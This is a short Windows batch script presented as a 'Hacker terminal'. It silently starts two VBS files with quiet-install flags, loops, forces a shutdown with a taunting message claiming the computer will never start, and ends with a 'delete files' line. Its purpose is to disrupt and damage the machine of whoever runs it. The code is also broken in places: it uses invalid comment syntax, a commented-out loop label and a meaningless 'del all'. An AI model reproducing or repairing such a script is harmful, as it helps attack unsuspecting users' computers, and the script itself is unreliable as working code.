@echo off
echo Welcome to Hacker terminal:)
start C:\Users\%user%\part1.vbs /msi EULA_ACCEPT=YES /qn 

//:wait
//echo Wait for 10 sec
pause
start C:\Users\%user%\part2.vbs /msi EULA_ACCEPT=YES /qn
goto wait


//shutdown part 
Message from Hacker!
msg * 
shutdown -c "Good night because your computer never starts !BYE" -s

//delete files 
del all